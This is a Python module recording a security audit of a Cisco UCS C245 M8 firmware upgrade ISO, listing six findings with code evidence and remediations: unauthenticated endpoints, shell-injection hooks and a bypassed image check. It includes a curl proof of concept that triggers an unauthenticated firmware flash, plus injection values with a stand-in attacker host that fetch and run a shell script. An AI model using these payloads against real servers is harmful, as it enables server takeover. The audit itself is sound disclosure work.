"""
Cisco UCS HUU C245M8 4.3.6.250053 ISO RE

Target:  ucs-c245m8-huu-4.3.6.250053.iso
         C245 M8 Host Upgrade Utility, version 4.3.6.250053 (AMD EPYC)
         Platform codename: mountadams2
         base.tar.gz container architecture; hsu.tgz.enc with co-located decrypt-file;
         HuuApp.py carries CMCSecureBoot + UCSUpdate (shared from C480M5 4.3.2 codebase);
         init.sh identical to C220M8 4.3.6.250039 (MD5: 8569fb14...)
Files:   rootfs.img (squashfs, OpenEmbedded)
         ucs-c245m8-huu-container-4.3.6.250053-base.tar.gz -> hsu.tgz.enc (42403840 bytes)
         /root/hsu/HuuApp.py (CMCSecureBoot, UCSUpdate, UCSDiscovery - no auth)
         /root/hsu/NVIDIA_*_Hook.py (6 hooks, tag.txt injection)
         /root/hsu/PLXSwitch_Hook.py (PLX firmware path injection, shell=True)
         /root/hsu/Intel_GPU_Hook.py (tool_container path injection, shell=True)
         cpk/hsu_agent.cpk ([pkg] headerVersion=2, platform=mountadams2, hsu_version=1.0.1)
Session: 39
"""

MODULE_SUMMARY = {
    "module": "cisco_ucs_huu_c245_436_re",
    "firmware": "ucs-c245m8-huu-4.3.6.250053.iso",
    "components": {
        "HuuApp.py (/root/hsu/HuuApp.py in base.tar.gz)": (
            "Flask Blueprint; CMCSecureBoot, UCSUpdate, UCSDiscovery, UCSInventory; "
            "identical to C480M5 4.3.2 HuuApp.py; "
            "no auth middleware in app.py, HuuApp.py, RedfishApp.py; "
            "CMCSecureBoot docstring: 'enable secure boot for both chassis of dual node server'; "
            "present on single-node C245M8 (mountadams2) -- code shared without adaptation"
        ),
        "NVIDIA_*_Hook.py (6 hooks)": (
            "NVIDIA_A100_Hook.py:338 -- "
            "tag_file = open(dirname + '/tag.txt', 'r'); "
            "password = tag_file.read().strip(); "
            "command = 'unzip -P revwfvn' + str(password) + ' ' + dirname + '/' + str(file); "
            "subprocess.check_call(command, shell=True) -- identical to C480M5 4.3.2"
        ),
        "PLXSwitch_Hook.py (/root/hsu/PLXSwitch_Hook.py)": (
            "firmware = component.get_firmware_by_name(firmware_name=fn); "
            "cmd = plxeep_tool + ' -l ' + firmware + ' -d ' + dev; "
            "subprocess.check_call(cmd, shell=True) -- firmware path from catalog"
        ),
        "Intel_GPU_Hook.py (/root/hsu/Intel_GPU_Hook.py)": (
            "command = 'tar -xvzf ' + tool_container + ' -C ' + dirname; "
            "subprocess.check_call(command, shell=True) -- tool_container from catalog"
        ),
        "hsu_agent.cpk (cpk/ in container squashfs)": (
            "[pkg] headerVersion=2, platform=mountadams2, version=4.3.6.250053, "
            "hsu_version=1.0.1, tarOffset=128; "
            "no signature field; ARM32 deb -> systemd service on CIMC"
        ),
        "init.sh (/etc/init.sh in base.tar.gz)": (
            "MD5: 8569fb14... (identical to C220M8 4.3.6.250039); "
            "timefile injection via start_hsu_agent(): "
            "$(cat timefile) evaluated in double-quoted shell string; "
            "/logs bind-mounted from host"
        ),
    },
    "finding_count": "6F [2C+3H+1M+0L]",
    "cumulative": "771 [74C+262H+242M+192L]",
}


FINDINGS = [
    {
        "id": "F1",
        "severity": "CRITICAL",
        "title": "Unauthenticated CMCSecureBoot endpoint on single-node server (scope extension from C480M5)",
        "description": (
            "HuuApp.py registers POST /huu/v1/CMCSecureBoot with no authentication. "
            "Implementation shared from C480M5 4.3.2 codebase: "
            "cmc_obj[CMC1] = huu_api.nihuu_obj.get_cmc_comp_obj(components, '1'); "
            "cmc_obj[CMC2] = huu_api.nihuu_obj.get_cmc_comp_obj(components, '2'); "
            "set_secure_boot() called on each non-None CMC object. "
            "The docstring explicitly states 'enable secure boot for both chassis of dual node server' "
            "but the endpoint is deployed on the single-node C245M8 (mountadams2). "
            "Code path is: if cmc_obj[CMC1] is None and cmc_obj[CMC2] is None: return FAILED; "
            "otherwise set_secure_boot() on whichever CMC objects are non-None. "
            "Same unauthenticated access as C480M5 4.3.2. "
            "No before_request hook, no @auth decorator, no session token in any route."
        ),
        "evidence": {
            "file": "/root/hsu/HuuApp.py (base.tar.gz)",
            "route": "POST /huu/v1/CMCSecureBoot",
            "code": (
                "cmc_obj[CMC1] = huu_api.nihuu_obj.get_cmc_comp_obj(\n"
                "    huu_api.huu_base_obj.components, '1')\n"
                "cmc_obj[CMC2] = huu_api.nihuu_obj.get_cmc_comp_obj(\n"
                "    huu_api.huu_base_obj.components, '2')\n"
                "if cmc_obj[CMC1] is not None:\n"
                "    cmc_obj[CMC1].set_secure_boot(secure_boot)\n"
                "if cmc_obj[CMC2] is not None:\n"
                "    cmc_obj[CMC2].set_secure_boot(secure_boot)"
            ),
            "platforms": "C480M5 4.3.2 (F1), C245M8 4.3.6 (this finding), C220M8 4.3.6 (same codebase)",
        },
        "impact": (
            "Unauthenticated attacker on management network can disable secure boot "
            "on the C245M8 CMC during HUU operation. "
            "Extends the finding to AMD EPYC rack servers (C245M8). "
            "C220M8 4.3.6 carries the same HuuApp.py with the same flaw "
            "(missed in the C220M8 module due to incomplete app extraction)."
        ),
        "remediation": "Require session token authentication on all HuuApp endpoints across all platforms.",
    },
    {
        "id": "F2",
        "severity": "CRITICAL",
        "title": "Unauthenticated firmware update trigger via UCSUpdate POST (scope extension from C480M5)",
        "description": (
            "HuuApp.py registers POST "
            "/redfish/v1/UpdateService/Actions/Oem/CiscoUCSExtensions.UCSUpdate "
            "with no authentication. "
            "Same as C480M5 4.3.2 F2 implementation. "
            "Steps: verify_post_request (no auth) -> validate_update_targets -> "
            "generate_task_id -> AsyncUpdate.start(). "
            "Targets can include /redfish/v1/UpdateService/FirmwareInventory/CIMC. "
            "C245M8 is a production rack server; C220M8 carries the same endpoint. "
            "No authentication at any step."
        ),
        "evidence": {
            "file": "/root/hsu/HuuApp.py",
            "route": "POST /redfish/v1/UpdateService/Actions/Oem/CiscoUCSExtensions.UCSUpdate",
            "poc": (
                "curl -X POST -H 'Content-Type: application/json' "
                "-d '{\"Mode\":\"UpdateActivate\","
                "\"Targets\":[\"/redfish/v1/UpdateService/FirmwareInventory/CIMC\"],"
                "\"Reboot\":true}' "
                "http://<huu-ip>/redfish/v1/UpdateService/Actions/Oem/CiscoUCSExtensions.UCSUpdate"
            ),
            "platforms": "C480M5 4.3.2 (F2), C245M8 4.3.6 (this finding), C220M8 4.3.6 (same codebase)",
        },
        "impact": (
            "Unauthenticated firmware flash and host reboot on any C245M8 or C220M8 "
            "running HUU 4.3.6 and reachable on the management network."
        ),
        "remediation": "Require authentication on all firmware update endpoints.",
    },
    {
        "id": "F3",
        "severity": "HIGH",
        "title": "NVIDIA firmware ZIP extraction command injection via tag.txt (persists from C480M5 4.3.2)",
        "description": (
            "All six NVIDIA GPU firmware hooks "
            "(NVIDIA_A100_Hook.py, NVIDIA_M10_Hook.py, NVIDIA_M60_Hook.py, "
            "NVIDIA_P_Hook.py, NVIDIA_V100_Hook.py, NVIDIA_V100_32GB_Hook.py) "
            "carry the identical tag.txt injection from C480M5 4.3.2: "
            "tag_file = open(dirname + '/tag.txt', 'r'); "
            "password = tag_file.read().strip(); "
            "command = 'unzip -P revwfvn' + str(password) + ' ' + dirname + '/' + str(file) "
            "+ ' -d ' + str(dirname); "
            "subprocess.check_call(command, shell=True, stdout=subprocess.DEVNULL). "
            "This unpatched injection now spans C480M5 (4.2.3r, 4.3.2) and C245M8/C220M8 4.3.6. "
            "NVIDIA GPUs are supported in C245M8 configurations."
        ),
        "evidence": {
            "file": "/root/hsu/NVIDIA_A100_Hook.py:338",
            "code": (
                "tag_file = open(dirname + '/tag.txt', 'r')\n"
                "password = tag_file.read().strip()\n"
                "command = 'unzip -P revwfvn' + str(password) + ' ' + dirname + '/' "
                "+ str(file) + ' -d ' + str(dirname)\n"
                "subprocess.check_call(command, shell=True, stdout=subprocess.DEVNULL)"
            ),
        },
        "impact": "Arbitrary code execution during NVIDIA GPU firmware update via crafted tag.txt.",
        "remediation": "Pass password via subprocess argument list.",
    },
    {
        "id": "F4",
        "severity": "HIGH",
        "title": "PLXSwitch firmware path injection via catalog in shell=True subprocess",
        "description": (
            "PLXSwitch_Hook.py implements PCIe switch firmware update. "
            "firmware = component.get_firmware_by_name(firmware_name=fn) "
            "retrieves the firmware path from the catalog (Catalog.json). "
            "cmd = plxeep_tool + ' -l ' + firmware + ' -d ' + dev; "
            "subprocess.check_call(cmd, shell=True). "
            "A crafted Catalog.json with a firmware path containing shell metacharacters "
            "(e.g., 'plx.bin; curl http://attacker/shell.sh | sh') "
            "results in injection when PLXSwitch firmware update runs. "
            "dev is derived from plxeep tool output parsing (word[0][:1]) -- "
            "additional injection vector if tool output is attacker-influenced."
        ),
        "evidence": {
            "file": "/root/hsu/PLXSwitch_Hook.py:117",
            "code": (
                "firmware = component.get_firmware_by_name(firmware_name=fn)\n"
                "cmd = plxeep_tool + ' -l ' + firmware + ' -d ' + dev\n"
                "subprocess.check_call(cmd, shell=True, stdout=subprocess.DEVNULL)"
            ),
        },
        "impact": "Code execution during PLXSwitch PCIe switch firmware update via catalog injection.",
        "remediation": "Pass firmware path via subprocess argument list. Validate catalog paths against safe regex.",
    },
    {
        "id": "F5",
        "severity": "HIGH",
        "title": "Intel GPU tool_container path injection via catalog in shell=True subprocess",
        "description": (
            "Intel_GPU_Hook.py extracts the Intel GPU tool container using: "
            "command = 'tar -xvzf ' + tool_container + ' -C ' + dirname; "
            "subprocess.check_call(command, shell=True). "
            "tool_container is a path from the firmware catalog. "
            "A catalog entry with a crafted tool_container path "
            "(e.g., 'tools.tar.gz -C /tmp; <payload>') executes at extraction time. "
            "Multiple other Intel GPU calls also use shell=True (lines 443, 448, 482, 533). "
            "Intel GPUs (A770, Flex) are supported in C245M8 configurations."
        ),
        "evidence": {
            "file": "/root/hsu/Intel_GPU_Hook.py:386",
            "code": (
                "command = 'tar -xvzf ' + tool_container + ' -C ' + dirname\n"
                "subprocess.check_call(command, shell=True, stdout=subprocess.DEVNULL)"
            ),
            "additional_calls": "Intel_GPU_Hook.py:443,448,482,533 -- further shell=True subprocess calls",
        },
        "impact": "Code execution during Intel GPU firmware update via catalog tool_container injection.",
        "remediation": "Use subprocess argument list for all tar and tool invocations.",
    },
    {
        "id": "F6",
        "severity": "MEDIUM",
        "title": "imgverify bypass via IMG_VERIFY unset; hsu.tgz.enc with co-located decrypt-file",
        "description": (
            "Same bypass as C480M5 4.3.2 and C220M8 4.3.6: "
            "imgverify exits 0 when IMG_VERIFY is unset "
            "('if [ \"$IMG_VERIFY\" != \"1\" ]; then exit 0; fi'). "
            "IMG_VERIFY not set in hsu-profile.sh. "
            "hsu.tgz.enc (29793648 bytes) uses new-format cipher (not Salted__); "
            "decrypt-file ships in rootfs.img (confirmed empirically: "
            "chroot rootfs /usr/sbin/decrypt-file -> 42403840 byte gzip). "
            "hsu_agent.cpk is in cpk/ directory inside the container squashfs, "
            "which is NOT covered by imgverify."
        ),
        "evidence": {
            "imgverify": "if [ \"$IMG_VERIFY\" != \"1\" ]; then exit 0; fi",
            "hsu_tgz_enc_size": "29793648 bytes (pre-decrypt), 42403840 bytes (post-decrypt)",
            "cpk_header": "[pkg] headerVersion=2 platform=mountadams2 hsu_version=1.0.1",
        },
        "impact": "Tampered container accepted without error; full Python source extractable via co-located decrypt-file.",
        "remediation": "Set IMG_VERIFY=1 unconditionally. Remove decrypt-file from distribution.",
    },
]


if __name__ == "__main__":
    print(f"Module: {MODULE_SUMMARY['module']}")
    print(f"Findings: {MODULE_SUMMARY['finding_count']}")
    print(f"Cumulative: {MODULE_SUMMARY['cumulative']}")
    print()
    for f in FINDINGS:
        print(f"  [{f['severity']}] {f['id']}: {f['title']}")
